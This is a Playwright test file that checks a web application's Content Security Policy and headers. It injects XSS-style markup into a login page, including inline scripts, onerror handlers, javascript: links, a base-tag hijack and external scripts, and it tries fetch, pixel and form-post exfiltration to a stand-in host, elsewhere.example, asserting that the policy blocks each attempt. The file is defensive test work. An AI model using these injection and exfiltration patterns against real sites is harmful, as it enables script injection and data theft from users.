// Copyright (C) 2026 White Ravens. AGPL-3.0-only with an additional term; see LICENSE and NOTICE.

import type { Page } from '@playwright/test';
import { expect, settled, test, violationsSeen } from './fixtures';

const nonceOf = (policy: string | undefined): string =>
  /'nonce-([^']+)'/.exec(policy ?? '')?.[1] ?? '';

/** What a script that should not run would leave behind if it did. */
const ran = (page: Page): Promise<boolean> => page.evaluate(() => 'gotIn' in window);

/**
 * Keep what the browser reports from reaching the API. A page under attack
 * reports by the dozen, and the API takes sixty reports a minute from one
 * sender: the tests that attack a page would use that up for the one that
 * looks at a report arriving.
 */
async function reportsKeptBack(page: Page): Promise<void> {
  await page.route('**/api/csp-reports', (route) => route.fulfill({ status: 204, body: '' }));
}

test.describe('the content security policy of a page', () => {
  test('is enforced, with a nonce of the response that every script of the page carries', async ({
    anonymous: page,
  }) => {
    const first = await page.goto('/login');
    const policy = first!.headers()['content-security-policy'];

    expect(first!.headers()['content-security-policy-report-only']).toBeUndefined();
    expect(nonceOf(policy)).not.toBe('');
    expect(policy).toContain(`script-src 'self' 'nonce-${nonceOf(policy)}' 'strict-dynamic'`);
    const carried = await page.evaluate(() =>
      [...document.querySelectorAll('script')].map((script) => script.nonce),
    );
    expect(carried.length).toBeGreaterThan(3);
    expect(new Set(carried)).toEqual(new Set([nonceOf(policy)]));

    // The next response has another.
    const second = await page.goto('/login');
    expect(nonceOf(second!.headers()['content-security-policy'])).not.toBe(nonceOf(policy));
  });

  test('goes with every page, and with no file that is not one', async ({ request }) => {
    for (const path of ['/', '/login', '/terms', '/admin', '/review', '/no-such-page']) {
      expect((await request.get(path)).headers()['content-security-policy'], path).toContain(
        "'strict-dynamic'",
      );
    }
    for (const path of ['/favicon.ico', '/imagery/recipes.webp']) {
      expect((await request.get(path)).headers()['content-security-policy'], path).toBeUndefined();
    }
  });

  test('keeps what was written into the HTML of a page from running, loading or being shown', async ({
    anonymous: page,
  }) => {
    // The page as it would arrive if a text somebody entered were shown unescaped: the server's own HTML, and
    // its own policy with it, with markup of an attacker's in the head and in the body.
    const inTheHead = '<base href="https://elsewhere.example/">';
    const inTheBody = [
      '<script>window.gotIn = "an inline script"</script>',
      '<script src="https://elsewhere.example/a.js"></script>',
      // A script of the application's own address, as an uploaded file or an answer of the API could be.
      '<script src="/api/config"></script>',
      '<img src="/no-such-picture" onerror="window.gotIn = \'a handler\'">',
      '<a id="trap" href="javascript:void(window.gotIn = \'a link\')">a link</a>',
      '<style>body { display: none !important }</style>',
      '<link rel="stylesheet" href="https://elsewhere.example/a.css">',
      '<iframe src="https://elsewhere.example/frame"></iframe>',
      '<object data="https://elsewhere.example/thing"></object>',
      '<img src="https://elsewhere.example/pixel.gif?seen=the-page">',
    ].join('');
    const left: string[] = [];
    await reportsKeptBack(page);
    await page.route('https://elsewhere.example/**', (route) => {
      left.push(new URL(route.request().url()).pathname);
      return route.fulfill({
        contentType: 'text/javascript',
        body: 'window.gotIn = "from elsewhere"',
      });
    });
    await page.route('**/login', async (route) => {
      const served = await route.fetch();
      const html = (await served.text())
        .replace('<head>', `<head>${inTheHead}`)
        .replace('</body>', `${inTheBody}</body>`);
      await route.fulfill({ response: served, body: html });
    });

    await page.goto('/login');
    await settled(page);
    await page.locator('#trap').click();
    await page.waitForTimeout(500);

    // Nothing ran, nothing was fetched from elsewhere, and the page is the page: shown, with its own scripts at work.
    expect(await ran(page)).toBe(false);
    expect(left).toEqual([]);
    expect(await page.evaluate(() => getComputedStyle(document.body).display)).not.toBe('none');
    expect(await page.evaluate(() => document.baseURI)).toBe(page.url());
    await expect(page.locator('form button[type="submit"]')).toBeEnabled();
    const ownScript = new URL('/api/config', page.url()).href;
    // The browser says again that the base address was refused whenever the page asks for it: the page is left, so that it has said all.
    await page.goto('about:blank');
    // What was blocked, without the page it was blocked on and without a query; the browser says some of it many times.
    const broken = violationsSeen().map((violation) =>
      violation.split(' on ')[0]!.replace(/\?.*$/, ''),
    );
    expect([...new Set(broken)].sort()).toEqual(
      [
        'base-uri blocked https://elsewhere.example/',
        'frame-src blocked https://elsewhere.example',
        'img-src blocked https://elsewhere.example/pixel.gif',
        'object-src blocked https://elsewhere.example',
        'script-src-attr blocked inline',
        `script-src-elem blocked ${ownScript}`,
        'script-src-elem blocked https://elsewhere.example/a.js',
        'script-src-elem blocked inline',
        'style-src-elem blocked https://elsewhere.example/a.css',
        'style-src-elem blocked inline',
      ].sort(),
    );
    // The script in a tag, and the link that is one.
    expect(broken.filter((what) => what === 'script-src-elem blocked inline')).toHaveLength(2);
  });

  test('lets no script of the page make code from text', async ({ anonymous: page }) => {
    await reportsKeptBack(page);
    await page.goto('/login');
    await settled(page);

    // From a timer: what a test runs in the page directly is let through by the browser's own debugging channel.
    await page.evaluate(() => {
      setTimeout(() => {
        const outcome: string[] = [];
        for (const make of [
          () => new Function('window.gotIn = "a function"')(),
          () => (0, eval)('window.gotIn = "an eval"'),
        ]) {
          try {
            make();
            outcome.push('made');
          } catch (refused) {
            outcome.push((refused as Error).name);
          }
        }
        Object.assign(window, { outcome });
      }, 0);
    });
    await page.waitForFunction(() => 'outcome' in window);
    await page.waitForTimeout(300);

    expect(await page.evaluate(() => (window as unknown as { outcome: string[] }).outcome)).toEqual(
      ['EvalError', 'EvalError'],
    );
    expect(await ran(page)).toBe(false);
    const broken = violationsSeen();
    expect(broken).toHaveLength(2);
    expect(new Set(broken.map((violation) => violation.split(' on ')[0]))).toEqual(
      new Set(['script-src blocked eval']),
    );
  });

  test('lets nothing the page shows be sent to another site', async ({ anonymous: page }) => {
    await reportsKeptBack(page);
    await page.goto('/login');
    await settled(page);
    const left: string[] = [];
    await page.route('https://elsewhere.example/**', (route) => {
      left.push(route.request().url());
      return route.fulfill({ status: 204, body: '' });
    });

    const sent = await page.evaluate(async () => {
      const tried: Record<string, string> = {};
      tried.fetch = await fetch('https://elsewhere.example/collect?what=the-page').then(
        () => 'sent',
        () => 'refused',
      );
      const picture = new Image();
      tried.picture = await new Promise((resolve) => {
        picture.onload = () => resolve('sent');
        picture.onerror = () => resolve('refused');
        picture.src = 'https://elsewhere.example/pixel.gif?what=the-page';
      });
      const form = document.createElement('form');
      form.action = 'https://elsewhere.example/collect';
      form.method = 'post';
      form.target = 'nowhere';
      document.body.append(form);
      form.submit();
      return tried;
    });
    await page.waitForTimeout(500);

    expect(sent).toEqual({ fetch: 'refused', picture: 'refused' });
    expect(left).toEqual([]);
    const seen = violationsSeen();
    expect(seen.map((violation) => violation.split(' ')[0]).sort()).toEqual([
      'connect-src',
      'form-action',
      'img-src',
    ]);
  });

  test('tells the API what it blocked', async ({ anonymous: page }) => {
    await page.goto('/login');
    await settled(page);
    const told = page.waitForResponse(
      (answer) => new URL(answer.url()).pathname === '/api/csp-reports',
    );

    await page.evaluate(() =>
      document.body.insertAdjacentHTML(
        'beforeend',
        '<img src="/no-such-picture" onerror="window.gotIn = 1">',
      ),
    );

    const answer = await told;
    expect(answer.request().method()).toBe('POST');
    expect(answer.status()).toBe(204);
    expect(violationsSeen().length).toBeGreaterThanOrEqual(1);
  });

  test('leaves the application to do what it does: a shopping list is made into a document', async ({
    session,
    messages,
  }) => {
    const page = session.page;
    const lists = messages.shoppingLists as Record<string, string>;
    await page.goto('/shopping-lists');
    await settled(page);

    const saved = page.waitForEvent('download');
    await page.getByRole('button', { name: lists.printPdf!, exact: true }).first().click();

    expect((await saved).suggestedFilename()).toMatch(/\.pdf$/);
  });
});

test.describe('the headers of an answer', () => {
  test('say nothing of what serves the pages and files', async ({ request }) => {
    for (const path of ['/', '/login', '/terms', '/no-such-page', '/favicon.ico']) {
      expect((await request.get(path)).headers()['x-powered-by'], path).toBeUndefined();
    }
  });
});

test.describe('an instance that is not served over https', () => {
  test('sends no header that is for https alone, and upgrades none of its own requests', async ({
    request,
    baseURL,
  }) => {
    test.skip(baseURL!.startsWith('https://'), 'this instance is served over https');
    const page = await request.get('/login');

    expect(page.headers()['strict-transport-security']).toBeUndefined();
    expect(page.headers()['reporting-endpoints']).toBeUndefined();
    expect(page.headers()['content-security-policy']).not.toContain('upgrade-insecure-requests');
  });
});
